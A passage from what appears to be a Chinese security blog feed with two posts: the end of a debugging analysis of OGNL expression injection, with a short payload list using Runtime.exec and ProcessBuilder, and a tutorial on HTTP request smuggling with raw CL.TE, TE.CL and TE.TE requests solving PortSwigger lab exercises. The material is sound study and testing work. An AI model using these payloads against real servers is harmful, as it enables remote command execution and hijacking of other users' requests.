src="/2020/03/16/OGNL表达式注入漏洞总结/10.png" alt=""></p><p>跟进第一个子节点的解析过程，在ASTStaticMethod.getValueBody()函数中调用了OgnlRuntime.callStaticMethod()方法，其中已经将第一个子节点的表达式中的类和方法分别提取出来了：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/11.png" alt=""></p><p>跟进去，其中调用了classForName()函数来根据className参数寻找到java.lang.Runtime类，再往下解析：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/12.png" alt=""></p><p>往下，调用OgnlRuntime.getMethods()函数获取到java.lang.Runtime类的getRuntime()方法后，进一步调用OgnlRuntime.callAppropriateMethod()函数进行解析：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/13.png" alt=""></p><p>跟进OgnlRuntime.callAppropriateMethod()函数中，这里就是通过调用invokeMethod()函数来实现OGNL表达式中的类方法的调用：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/14.png" alt=""></p><p>跟进它的invokeMethod()函数，看到是Method.invoke()即通过反射机制实现java.lang.Runtime.getRuntime()方法的调用：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/15.png" alt=""></p><p>当然这里只是ASTChain的第一个子节点，该类方法执行完还没弹计算器，关键还要解析完ASTChain的第二个子节点、形成解析OGNL表达式节点链来实现完整的类方法调用。</p><p>接着调试，我们会返回到ASTChain.getValueBody()函数的for循环中继续循坏遍历解析第二个子节点，可以看到此时第二个子节点的OGNL表达式内容为<code>exec(&quot;calc&quot;)</code>：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/16.png" alt=""></p><p>后面的解析过程和解析第一个子节点的时候几乎是一样的。在调用OgnlRuntime.callMethod()函数时，参数source为前面解析第一个子节点表达式时得到的Runtime类，另外两个参数则为分辨出的方法名和参数值：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/17.png" alt=""></p><p>往下，解析得到具体的类方法exec()：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/18.png" alt=""></p><p>往下，就是反射调用Runtime.exec()函数实现任意类方法调用来谈计算器了：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/19.png" alt=""></p><p>此时函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">invokeMethod:518, OgnlRuntime (ognl)</span><br><span class="line">callAppropriateMethod:812, OgnlRuntime (ognl)</span><br><span class="line">callMethod:61, ObjectMethodAccessor (ognl)</span><br><span class="line">callMethod:846, OgnlRuntime (ognl)</span><br><span class="line">getValueBody:73, ASTMethod (ognl)</span><br><span class="line">evaluateGetValueBody:170, SimpleNode (ognl)</span><br><span class="line">getValue:210, SimpleNode (ognl)</span><br><span class="line">getValueBody:109, ASTChain (ognl)</span><br><span class="line">evaluateGetValueBody:170, SimpleNode (ognl)</span><br><span class="line">getValue:210, SimpleNode (ognl)</span><br><span class="line">getValue:333, Ognl (ognl)</span><br><span class="line">getValue:378, Ognl (ognl)</span><br><span class="line">getValue:357, Ognl (ognl)</span><br><span class="line">main:11, Test</span><br></pre></td></tr></table></figure><p>简单地说，OGNL表达式的getValue()解析过程就是先将整个OGNL表达式按照语法树分为几个子节点树，然后循环遍历解析各个子节点树上的OGNL表达式，其中通过Method.invoke()即反射的方式实现任意类方法调用，将各个节点解析获取到的类方法通过ASTChain链的方式串连起来实现完整的表达式解析、得到完整的类方法调用。</p><h3 id="HTTP请求中常见的注入点"><a href="#HTTP请求中常见的注入点" class="headerlink" title="HTTP请求中常见的注入点"></a>HTTP请求中常见的注入点</h3><p>HTTP请求中常见的注入点如下表（来自<a href="https://www.freebuf.com/vuls/168609.html" target="_blank" rel="noopener">Struts2著名RCE漏洞引发的十年之思</a>）：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/4.png" alt=""></p><h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//获取context里面的变量</span><br><span class="line"> #user</span><br><span class="line"> #user.name</span><br><span class="line"></span><br><span class="line">//使用runtime执行系统命令</span><br><span class="line">@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//使用processbuilder执行系统命令</span><br><span class="line">(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start()</span><br><span class="line"></span><br><span class="line">//获取当前路径</span><br><span class="line">@java.lang.System@getProperty(&quot;user.dir&quot;)</span><br></pre></td></tr></table></figure><h2 id="0x04-Struts2中OGNL执行过程分析"><a href="#0x04-Struts2中OGNL执行过程分析" class="headerlink" title="0x04 Struts2中OGNL执行过程分析"></a>0x04 Struts2中OGNL执行过程分析</h2><p>有时间再调试分析，可参考：<a href="https://paper.seebug.org/794/#0x02-ognl" target="_blank" rel="noopener">浅析 OGNL 的攻防史</a></p><h2 id="0x05-OGNL攻防史"><a href="#0x05-OGNL攻防史" class="headerlink" title="0x05 OGNL攻防史"></a>0x05 OGNL攻防史</h2><p>有时间再详细分析，可参考：<a href="https://paper.seebug.org/794/#0x03-ognl" target="_blank" rel="noopener">浅析 OGNL 的攻防史</a></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="http://c.biancheng.net/view/4131.html" target="_blank" rel="noopener">OGNL</a></p><p><a href="http://p0desta.com/2019/04/06/从零开始java代码审计系列(三" target="_blank" rel="noopener">OGNL表达式注入分析</a>/)</p><p><a href="https://paper.seebug.org/794/" target="_blank" rel="noopener">浅析 OGNL 的攻防史</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="OGNL注入" scheme="https://www.mi1k7ea.com/tags/OGNL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析HRS漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/03/11/%E6%B5%85%E6%9E%90HRS%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/03/11/浅析HRS漏洞/</id>
    <published>2020-03-11T15:59:05.000Z</published>
    <updated>2020-03-15T15:41:01.223Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>主要参考：<a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">HTTP Desync Attacks: Request Smuggling Reborn</a></p><p>实验环境：<a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP request smuggling</a></p><p>BurpSuite插件http-request-smuggler：<a href="https://github.com/portswigger/http-request-smuggler" target="_blank" rel="noopener">https://github.com/portswigger/http-request-smuggler</a></p><p>推荐一些深入浅出的好文：</p><p><a href="https://xz.aliyun.com/t/6878" target="_blank" rel="noopener">一篇文章带你读懂 HTTP Smuggling 攻击</a></p><p><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">协议层的攻击——HTTP请求走私</a></p><p>HRS扫描原理及实现：</p><p><a href="https://blog.riskivy.com/%E6%B5%81%E9%87%8F%E5%A4%B9%E5%B8%A6http-request-smuggling-%E6%A3%80%E6%B5%8B%E6%96%B9%E6%A1%88%E7%9A%84%E5%AE%9E%E7%8E%B0/" target="_blank" rel="noopener">流量夹带(HTTP Request Smuggling) 检测方案的实现</a></p><h2 id="0x01-HRS简介"><a href="#0x01-HRS简介" class="headerlink" title="0x01 HRS简介"></a>0x01 HRS简介</h2><p>HRS全称Http Request Smuggling即HTTP请求走私。HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术，其允许攻击者绕过安全控制，获得对敏感数据的未经授权的访问，并直接危害其他应用程序用户。此外，还可以结合XSS、Web缓存中毒等深入利用。</p><p>HRS最早于2005年就被发现了，但因利用方式和危害影响所限被一直忽视。直至最近几年因为重视敏感信息的窃取以及利用新方法的提出才被重新提及。</p><h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>简单地说，<strong>HRS漏洞的根源在于前端服务器和后端服务器对HTTP请求解析存在二义性</strong>。</p><h3 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h3><blockquote><p>当今的Web应用程序经常在用户和最终应用程序逻辑之间使用HTTP服务器链，即用户将请求发送到前端服务器（有时称为负载均衡器或反向代理），此服务器将请求转发给一个或多个后端服务器。</p><p>当前端服务器将HTTP请求转发到后端服务器时，通常会通过相同的后端网络连接发送多个请求，因为这样做的效率和性能要高得多。协议非常简单：一个接一个地发送HTTP请求，接收服务器解析HTTP请求头，以确定一个请求的结束位置和下一个请求开始的位置：</p></blockquote><p><img src="/2020/03/11/浅析HRS漏洞/1.png" alt=""></p><blockquote><p>在这种情况下，前端和后端服务器必须就请求之间的边界达成一致。否则，攻击者可能会发送由前端服务器和后端服务器不同解释的模糊请求：</p></blockquote><p><img src="/2020/03/11/浅析HRS漏洞/2.png" alt=""></p><blockquote><p>在这里，攻击者将其前端请求的一部分由后端服务器解释为下一个请求的开始。它有效地优先于下一个请求，因此可能会干扰应用程序处理该请求的方式。这是一次请求走私攻击，可能会造成毁灭性的后果。</p></blockquote><h3 id="两个HTTP头字段"><a href="#两个HTTP头字段" class="headerlink" title="两个HTTP头字段"></a>两个HTTP头字段</h3><p>大多数HRS漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：</p><ul><li>Content-Length（后面简称CL）</li><li>Transfer-Encoding（后面简称TE）</li></ul><p>CL头很常见，它指定消息体的长度（以字节为单位），比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q=smuggling</span><br></pre></td></tr></table></figure><p>TE头即传输编码标头，用于指定消息主体使用分组编码。这意味着消息体包含一个或多个数据块。每个块包含以字节为单位的块大小（以十六进制表示），后面是换行符，后面是块内容。消息以0大小的块结束。</p><p>chunk传输数据格式如下，其中size的值由16进制表示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q=smuggling</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>注意：许多安全测试人员不知道可以在HTTP请求中使用TE的原因有二：</p><ul><li>BurpSuite自动解压分组编码，使消息更易于查看和编辑；</li><li>浏览器通常不会在请求中使用TE，而且通常只在服务器响应中看到；</li></ul><h3 id="二义性造就HRS"><a href="#二义性造就HRS" class="headerlink" title="二义性造就HRS"></a>二义性造就HRS</h3><p>如果一个HTTP请求包含了两个标注请求结束位置不一致的头字段会怎么样呢？</p><p>假设前端优先考虑第一个CL，后端优先考虑第二个CL。从后端角度看，TCP的流程可能是以下这样的：</p><p><img src="/2020/03/11/浅析HRS漏洞/3.png" alt=""></p><p>在这个例子中，注入的“G”将攻击绿色用户的请求，他们可能会得到类似于“Unknown method GPOST”的响应。这就是因为前后端服务器对于HTTP请求的结束位置头字段解析的二义性导致的HRS问题。</p><p>而在现实中，双CL很少被使用，因为许多系统会明确地拒绝具有多个CL的请求。相反，我们将使用TE攻击系统，不过前提是使用RFC 2616规范。TE是HTTP1.1协议中定义的Web用户向服务器提交数据的一种方法，当服务器收到chunked编码方式的数据时会分配一个缓冲区存放之，如果提交的数据大小未知，客户端会以一个协商好的分块大小向服务器提交数据。</p><p>如果接收到的消息同时具有TE头字段和CL头字段，则必须忽略CL头字段。由于RFC 2616规范默许可以使用<code>Transfer-Encoding: chunked</code>和<code>Content-Length</code>处理请求，因此很少有服务器拒绝此类请求。</p><p>比如前端服务器支持CL，后端服务器支持TE，发送如下请求：</p><p><img src="/2020/03/11/浅析HRS漏洞/4.png" alt=""></p><p>由于前端服务器不支持TE而后端服务器支持，从而导致”G”注入到了绿色用户的请求，使得HRS攻击成功。</p><p>同理，前端服务器支持TE，后端服务器支持CL的例子如下，只需将两个头结束位置的设置颠倒一下即可：</p><p><img src="/2020/03/11/浅析HRS漏洞/5.png" alt=""></p><h2 id="0x03-漏洞类型"><a href="#0x03-漏洞类型" class="headerlink" title="0x03 漏洞类型"></a>0x03 漏洞类型</h2><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL.TE"></a>CL.TE</h3><p>CL.TE即前端服务器使用Content-Length头，后端服务器是使用Transfer-Encoding头。</p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 13</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">SMUGGLED</span><br></pre></td></tr></table></figure><p>前端服务器处理CL头并确定请求正文长度为13字节，直到“SMUGGLED”结束，并将此请求转发到后端服务器。但后端服务器处理TE头，因此将消息体视为使用分块编码。它按序处理数据块，但第一个块就为<code>0\r\n\r\n</code>数据块，因此处理终止，后续消息体“SMUGGLED”将不会被执行处理，后端服务器将这些字节视为序列中下一个请求的开始。此时，如果前端服务器继续向后端服务器转发请求，那么后端服务器下一个接收到的请求就会是：SMUGGLED+POST=SMUGGLEDPOST的请求方法，这样，后端服务器会返回响应：Unknown method SMUGGLEDPOST。</p><h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE.CL"></a>TE.CL</h3><p>TE.CL即前端服务器使用Transfer-Encoding头，后端服务器是使用Content-Length头。</p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">SMUGGLED</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>这种情况下，前端服务器支持TE，会将消息体视为分块编码方式，它处理第一个长度为8字节的数据块，内容是SMUGGLED，之后解析处理第二个块，它是0长度，因此解析终止。该请求转发到后端服务器之后，由于后端服务器采用CL，按照其中请求主体长度的3个字节，解析会执行到8之后的行开头，所以SMUGGLED及以下的内容就不会被处理，侯丹服务器会将余下内容视为请求序列中下一个请求的起始。</p><p>注意：要使用BurpSuite的Repeater发送此请求，首先需要转到Reperter菜单中确保未选中“UpdateContent-Length”选项。此外，还需要包含尾随序列0后面的\r\n\r\n。</p><h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE.TE"></a>TE.TE</h3><p>TE.TE即前端和后端服务器都支持采用Transfer-Encoding头，但其中一台服务器可以通过某种方式混淆报头，从而避免对其进行处理。从某种意义上还是CL.TE或TE.CL。</p><p>这里主要用到混淆TE头的技巧，包括但不限于如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: cow</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h3 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL.CL"></a>CL.CL</h3><p>在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。</p><p>就这种情况而言，一般都是无法利用了。但是总有服务器不会严格的实现该规范，假设前端服务器和后端服务器在收到类似的请求时，都不会返回400错误，但是前端服务器按照第一个CL的值对请求进行处理，而后端服务器按照第二个CL的值进行处理，这样同样存在HRS漏洞，如前面漏洞原理中讲到的例子：</p><p><img src="/2020/03/11/浅析HRS漏洞/3.png" alt=""></p><p>但是这种情况极其少见。</p><h2 id="0x04-漏洞案例与组合拳"><a href="#0x04-漏洞案例与组合拳" class="headerlink" title="0x04 漏洞案例与组合拳"></a>0x04 漏洞案例与组合拳</h2><h3 id="CL-TE-1"><a href="#CL-TE-1" class="headerlink" title="CL.TE"></a>CL.TE</h3><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。前端服务器拒绝未使用GET或POST方法的请求。要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。</p><p>构造报文如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: acf61f721e2f15be80da0791004a0040.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure><p>发送两次即可成功得到GPOST错误响应：</p><p><img src="/2020/03/11/浅析HRS漏洞/6.png" alt=""></p><p>这是因为前端服务器只认CL头，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure><p>当请求包经过前端服务器转发给后端服务器时，后端服务器只认TE头，当它读取到<code>0\r\n\r\n</code>时，认为已经读取到结尾了，但是剩下的字母<code>G</code>就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求，服务器在解析时当然会产生报错了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h3 id="TE-CL-1"><a href="#TE-CL-1" class="headerlink" title="TE.CL"></a>TE.CL</h3><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，后端服务器不支持TE。前端服务器拒绝未使用GET或POST方法的请求。要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。</p><p>首先我们构造如下报文，注意0之后必须要有两个回车：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac9a1f2d1e1f8046806d5ca1003d009c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">G</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>发送两次之后得到的是“G0POST”而非“GPOST”：</p><p><img src="/2020/03/11/浅析HRS漏洞/7.png" alt=""></p><p>要达到题目要求，那么我们修改下请求，中间再夹杂一个报文请求即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac9a1f2d1e1f8046806d5ca1003d009c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">12</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>注意，这里GPOST前面的12即是满足chunk格式的十六进制数，指明后面<code>GPOST / HTTP/1.1\r\n</code>的字节数即为0x12=18。</p><p>由于前端服务器处理TE头，当其读取到<code>0\r\n\r\n</code>时，认为是读取完毕了，此时这个请求对前端服务器来说是一个完整的请求，然后转发给后端服务器；后端服务器处理CL头，当它读取完<code>12\r\n</code>之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>发送两次报文即可成功报错：</p><p><img src="/2020/03/11/浅析HRS漏洞/8.png" alt=""></p><h3 id="TE-TE-1"><a href="#TE-TE-1" class="headerlink" title="TE.TE"></a>TE.TE</h3><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p><p>题目要求：本实验涉及一个前端和后端服务器，两个服务器以不同的方式处理重复的HTTP请求标头。前端服务器拒绝未使用GET或POST方法的请求。要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。</p><p>构造报文如下，经过多种混淆TE头的测试，如下这种形式可行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac201f121ec32767801f0d6a00ff0062.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">12</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>这里混淆了TE头。前端服务器能够正常解析这个TE头，将<code>0\r\n\r\n</code>之前的内容都传递给后端服务器；而后端服务器并不能正常解析这个TE头，导致只能解析CL头获取得到请求体大小为4，即只获取了<code>12\r\n</code>的内容，而这之后的“GPOST”开头的内容则放到缓存中和下一个请求合并一起解析，从而成功导致GPOST请求失败。</p><p>发送两次报文即可成功报错：</p><p><img src="/2020/03/11/浅析HRS漏洞/9.png" alt=""></p><h3 id="绕过前端服务器的安全控制"><a href="#绕过前端服务器的安全控制" class="headerlink" 